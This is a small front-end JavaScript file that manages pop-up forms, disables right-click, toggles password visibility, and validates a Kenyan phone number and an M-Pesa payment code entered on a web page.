/**
 * 
 */

 
    document.addEventListener('contextmenu', event => {
      event.preventDefault();
      alert('Right-click is Dissable for security reasons.');
    });
  
  function closePopupForm0() {
      var popupForm2 = document.getElementById("popupForm0");
      popupForm2.style.display = "none";
      
    }
 function showPopupForm0() {
      var popupForm2 = document.getElementById("popupForm0");

      popupForm2.style.display = "block";
      

    }

function closePopupForm1() {
      var popupForm2 = document.getElementById("popupForm1");
      popupForm2.style.display = "none";
      
    }
 function showPopupForm1() {
      var popupForm2 = document.getElementById("popupForm1");

      popupForm2.style.display = "block";
      setTimeout(closePopupForm1, 7000);
      setTimeout(showPopupForm0, 7000);
      setTimeout(closePopupForm0, 10000);
    }

    

    function showPopupForm2() {
      var popupForm2 = document.getElementById("popupForm2");

      popupForm2.style.display = "block";
    }

    function closePopupForm2() {
      var popupForm2 = document.getElementById("popupForm2");
      const code = document.getElementById('code');
      popupForm2.style.display = "none";
      code.value = '';
    }


     function showPopupForm3() {
      var popupForm2 = document.getElementById("popupForm3");
      popupForm2.style.display = "block";
    }

    function closePopupForm3() {
      const phone = document.getElementById('phone');
      var popupForm2 = document.getElementById("popupForm3");
      popupForm2.style.display = "none";
      phone.value ='';

    }


    function showPopupForm4() {
      var popupForm2 = document.getElementById("popupForm4");
      popupForm2.style.display = "block";
    }

    function closePopupForm4() {
      var popupForm2 = document.getElementById("popupForm4");
      popupForm2.style.display = "none";
    }

 function myFunction() {
  var x = document.getElementById("password");
  if (x.type === "password") {
    x.type = "text";
  } else {
    x.type = "password";
  }
}

// Get references to the elements
function form_function(){
var openBtn = document.getElementById("open-btn");
var closeBtn = document.getElementById("close-btn");
var popupForm = document.getElementById("popup-form");
var overlay = document.getElementById("overlay");

// Open the pop-up form
openBtn.addEventListener("click", function () {
    popupForm.style.display = "block";
    overlay.style.display = "block";
});

// Close the pop-up form
closeBtn.addEventListener("click", function () {
    popupForm.style.display = "none";
    overlay.style.display = "none";
});
}

 
function myFunction() {

  
const phone = document.getElementById('phone');
const pattern = /^(07|01)/;

if(phone.value == ''){
  alert('Please fill in your phone number')
}
else if(phone.value.length <10||phone.value.length >10){
  alert('Please input a valid phone number')
}
else if (!pattern.test(phone.value)) {
        alert("Wrong phone number format.");
      }
else{
  closePopupForm3();
  showPopupForm2();
}
}

function myFunction2() {
  
const code = document.getElementById('code');

if(code.value == ''){
  alert('Please Enter M-Pesa Code')
}
else if(code.value.length <10||code.value.length >10){
  alert('Invalid M-Pesa Code. Please check and try again')
}
else{
  showPopupForm1();
}

// Create a function to close Form1
function closeForm1() {
  document.getElementById("form1").style.display = "none";
}

// Create a function to open Form2
function openForm2() {
  document.getElementById("form2").style.display = "block";
}

// Set a timer to close Form1 after 5 seconds
setTimeout(closeForm1, 5000);

// Set a timer to open Form2 after 5 seconds
setTimeout(openForm2, 5000);

// Set a timer to close Form2 after 2 seconds
setTimeout(function() {
  document.getElementById("form2").style.display = "none";
}, 7000);

};